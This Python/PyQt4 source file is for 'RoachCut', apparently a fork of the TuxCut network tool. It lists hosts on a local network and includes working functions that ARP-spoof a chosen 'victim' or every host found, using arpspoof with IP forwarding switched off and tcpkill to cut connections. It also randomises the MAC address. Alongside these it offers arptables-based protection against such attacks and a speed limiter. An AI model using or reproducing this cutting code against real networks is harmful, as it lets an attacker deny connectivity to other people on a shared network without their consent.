# -*- coding: utf-8 -*-
import sys
import os
import random
import socket
import subprocess as sp
from threading import Thread
from PyQt4 import QtCore,QtGui,uic,QtNetwork
from AboutDialog import AboutDialog
import pix_rc

iplistall = []

class RoachCut(QtGui.QMainWindow):
    def __init__(self):
        QtGui.QMainWindow.__init__(self)
        uic.loadUi('ui/MainWindow.ui',self)

        # load ini
        self.settings = QtCore.QSettings("linuxac.org","TuxCut")
        if self.settings.value("Language")=="English":
            self.actionEnglish.setChecked(True)

        # List Available network interfaces
        self.stopThread = True
        ifaces_names = []
        ifaces_macs = []
        ifaces = QtNetwork.QNetworkInterface.allInterfaces()
        for i in ifaces:
            ifaces_names.append(str(i.name()))
            ifaces_macs.append(str(i.hardwareAddress()))
        Result,ok = QtGui.QInputDialog.getItem(self,self.tr("Network Interfaces"),self.tr("Select your Interface:"),ifaces_names,0,True)
        if ok:
            self._iface = Result
            self._my_mac =ifaces_macs[ifaces_names.index(Result)]
            for j in ifaces_names:
                self.comboIfaces.addItem(j)
            self.comboIfaces.setCurrentIndex(ifaces_names.index(Result))  # Set the selected interface card in the main windows comboBox
        else:
            self.msg(self.tr("You must select an interface card , RoachCut Will close"))

        self._gwMAC=None
        self._isProtected = False
        self._isFedora = False
        self.check_fedora()
        self._isQuit = False
        self._cutted_hosts = {}
        self._killed_hosts = {}
        self.show_Window()
        self._gwIP = self.default_gw()
        if  self._gwIP==None:
            self.msg(self.tr("RoachCut couldn't detect the gateway IP address"))
        self._gwMAC = self.gw_mac(self._gwIP)
        if self._my_mac==None:
            self.msg(self.tr("RoachCut couldn't detect your MAC address"))
        else:
            self.lbl_mac.setText(self._my_mac)

        if not self._gwMAC==None:
            self.enable_protection()
        else:
            self.msg(self.tr("RoachCut couldn't detect the gateway MAC address\nThe protection mode couldn't be enabled"))
        self.list_hosts(self._gwIP)


    def show_Window(self):
        screen = QtGui.QDesktopWidget().screenGeometry()
        size =  self.geometry()
        self.move((screen.width()-size.width())/2, (screen.height()-size.height())/2)

        self.table_hosts.setColumnWidth(0,150)
        self.table_hosts.setColumnWidth(1,150)
        self.table_hosts.setColumnWidth(2,200)
        self.show()
        self.tray_icon()

    def tray_icon(self):
        self.trayicon=QtGui.QSystemTrayIcon(QtGui.QIcon(':pix/pix/roachcut.png'))
        self.trayicon.show()
        self.menu=QtGui.QMenu()

        self.menu.addAction(self.action_change_mac)
        self.menu.addAction(self.action_quit)

        self.trayicon.setContextMenu(self.menu)
        self.trayicon.activated.connect(self.onTrayIconActivated)

    def onTrayIconActivated(self, reason):
        if reason == QtGui.QSystemTrayIcon.DoubleClick:
            if self.isVisible():
                self.hide()
                self.trayicon.showMessage('RoachCut is still Running', 'The programe is still running.\n Right click the trayicon to resore RoachCut or to Quit')
            else:
                self.show()

    def closeEvent(self, event):
            self.disable_protection()
            self.stopThread = True
            self.close()

    def check_fedora(self):
        if os.path.exists('/etc/redhat-release'):
            self._isFedora = True
        else:
            self._isFedora = False

    def default_gw(self):
        gwip = sp.Popen(['ip','route','list'],stdout = sp.PIPE)
        for line in  gwip.stdout:
            if 'default' in line:
                #self._iface = line.split()[4]
                return  line.split()[2]



    def gw_mac(self,gwip):
        arping = sp.Popen(['arp-scan','--interface',self._iface,self._gwIP],stdout = sp.PIPE)
        for line in arping.stdout:

            if line.startswith(self._gwIP.split('.')[0]):
                return line.split()[1]

    def list_hosts(self, ip):
        live_hosts = []
        if self._isProtected:
            print "protected"
            arping = sp.Popen(['arp-scan','--interface',self._iface,ip],stdout = sp.PIPE,shell=False)
        else:
            print "Not Protected"
            arping = sp.Popen(['arp-scan','--interface',self._iface,ip+'/24'],stdout = sp.PIPE,shell=False)
        i=1
        for line in arping.stdout:
            if line.startswith(ip.split('.')[0]):
                ip = line.split()[0]
                mac= line.split()[1]
                self.table_hosts.setRowCount(i)
                self.table_hosts.setItem(i-1,0,QtGui.QTableWidgetItem(ip))
                self.table_hosts.item(i-1,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
                self.table_hosts.setItem(i-1,1,QtGui.QTableWidgetItem(mac))
                live_hosts.append(ip)
                iplistall.append(ip)
                i=i+1
        self.myThread = Thread(target=self.list_hostnames,args=(live_hosts,))
        self.myThread.start()

    def list_hostnames(self,ipList):
        if self.stopThread:
            return False
        else:
            i=0
            for ip in ipList:
                try:
                    hostname= socket.gethostbyaddr(ip)
                    print hostname[0]
                    self.table_hosts.setItem(i,2,QtGui.QTableWidgetItem(hostname[0]))
                except:
                    print "Couldn't Resolve  Host ",ip
                    self.table_hosts.setItem(i,2,QtGui.QTableWidgetItem("Not Resolved"))
                i=i+1
                return True

    def enable_protection(self):
        sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        if self._isFedora:
            print "This is a RedHat based distro"
            sp.Popen(['arptables','-P','IN','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-P','OUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-A','IN','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-A','OUT','-d',self._gwIP,'--target-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        else:
            print "This is not a RedHat based distro"
            sp.Popen(['arptables','-P','INPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-P','OUTPUT','DROP'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-A','INPUT','-s',self._gwIP,'--source-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-A','OUTPUT','-d',self._gwIP,'--destination-mac',self._gwMAC,'-j','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)

        self._isProtected = True
        self.trayicon.showMessage(self.tr('Protection Enabled!'), self.tr('You are protected againest NetCut attacks'))
        if not self.cbox_protection.isChecked():
            self.cbox_protection.setCheckState(QtCore.Qt.Checked)

    def disable_protection(self):
        if self._isFedora:
            sp.Popen(['arptables','-P','IN','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-P','OUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        else:
            sp.Popen(['arptables','-P','INPUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            sp.Popen(['arptables','-P','OUTPUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        self._isProtected = False
        self.trayicon.showMessage(self.tr('Protection Disabled!'), self.tr('You are not protected against RoachCut attacks'))

    def cut_process(self,victim_IP,row):
        ## Disable ip forward
        """

        :rtype : object
        """
        proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)

        ### Start Arpspoofing the victim
        proc_spoof = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        #os.system("sudo tcpkill -i "+icard+" -3 net "+vicip+" & >/dev/null")
        proc_kill = sp.Popen(['tcpkill','-i',self._iface,'-3','net',victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        self._cutted_hosts[victim_IP]=proc_spoof.pid
        self._killed_hosts[victim_IP]=proc_kill.pid
        if row == "all":
            for i in range(0,len(iplistall)):
                self.table_hosts.item(i,0).setIcon(QtGui.QIcon(':pix/pix/offline.png'))
        else:
            self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/offline.png'))
        print "Cutted hosts are : ",self._cutted_hosts
        print "Killed hosts are : ",self._killed_hosts

    def resume_all(self):
        sp.Popen(['sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['killall','9','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['killall','9','tcpkill'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        hosts_number = self.table_hosts.rowCount()
        for i in range (0,self.table_hosts.rowCount()):
            self.table_hosts.item(i,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
            i=+1
        self._cutted_hosts.clear()



    def resume_single_host(self,victim_IP,row):
        if self._cutted_hosts.has_key(victim_IP):
            pid_spoof = self._cutted_hosts[victim_IP]
            os.kill(pid_spoof,9)
            self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
            del self._cutted_hosts[victim_IP]
        if self._killed_hosts.has_key(victim_IP):
            pid_kill = self._killed_hosts[victim_IP]
            os.kill(pid_kill,9)
            del self._killed_hosts[victim_IP]

    def change_mac(self):
        new_MAC =':'.join(map(lambda x: "%02x" % x, [ 0x00,
                                                    random.randint(0x00, 0x7f),
                                                    random.randint(0x00, 0x7f),
                                                    random.randint(0x00, 0x7f),
                                                    random.randint(0x00, 0xff),
                                                    random.randint(0x00, 0xff)]))
        print 'Your new MAC is : ',new_MAC
        self.lbl_mac.setText(new_MAC)
        sp.Popen(['ifconfig',self._iface,'down','hw','ether',new_MAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['ifconfig',self._iface,'up'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)

    def on_protection_changes(self):
        if self.cbox_protection.isChecked():
            self.enable_protection()
        else:
            self.disable_protection()

    def on_refresh_clicked(self):
        self._iface= self.comboIfaces.currentText()
        self.list_hosts(self._gwIP)

    def on_cut_clicked(self):
        selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
        victim_IP =str(self.table_hosts.item(selectedRow,0).text())
        if not victim_IP==None:
            self.cut_process(victim_IP,selectedRow)

    def on_cut_all_clicked(self):
        selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
        print iplistall
        for ip in iplistall:
            victim_IP =str(ip)
            if not victim_IP==None:
                self.cut_process(victim_IP,"all")

    def on_resume_clicked(self):
        selectedRow =  self.table_hosts.selectionModel().currentIndex().row()
        victim_IP =str(self.table_hosts.item(selectedRow,0).text())
        if not victim_IP==None:
            self.resume_single_host(victim_IP,selectedRow)

    def on_quit_triggered(self):
        self._isQuit = True
        self.closeEvent(QtGui.QCloseEvent)
        self.resume_all()

    def on_about_clicked(self):
        about_dialog = AboutDialog()
        about_dialog.exec_()

    def msg(self,text):
        msgBox = QtGui.QMessageBox()
        msgBox.setText(text)
        msgBox.setStandardButtons(QtGui.QMessageBox.Close)
        msgBox.setDefaultButton(QtGui.QMessageBox.Close)
        ret = msgBox.exec_()
        if ret==QtGui.QMessageBox.Close:
            #sys.exit()
            pass
    def english_selected(self):
        #self.actionfuturelanguage.setChecked(False)
        self.settings.setValue("Language","English")

    def limit_speed(self):
        speedLimit, ok = QtGui.QInputDialog.getInteger(self, self.tr('Speed Limiter'), self.tr('Enter your desired speed in Kilo-Bytes per second:'))
        if ok:
            self.action_speedlimiter_on.setChecked(True)
            self.action_speedlimiter_off.setChecked(False)
            sp.Popen(['wondershaper',self._iface,str(speedLimit),'9999999'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
            self.trayicon.showMessage(self.tr('Speed Limiter Enabled!'), self.tr('Your Speed is limited to %s Kb/Sec'%speedLimit))
        else:
            self.action_speedlimiter_off.setChecked(True)
            self.action_speedlimiter_on.setChecked(False)

    def unlimit_speed(self):
        self.action_speedlimiter_on.setChecked(False)
        sp.Popen(['wondershaper','clear',self._iface],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        sp.Popen(['killall','9','wondershaper'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
        self.trayicon.showMessage(self.tr('Speed Limiter Disabled!'), self.tr('Your Speed is not limited'))

    def about_qt(self):
        QtGui.QApplication.aboutQt()
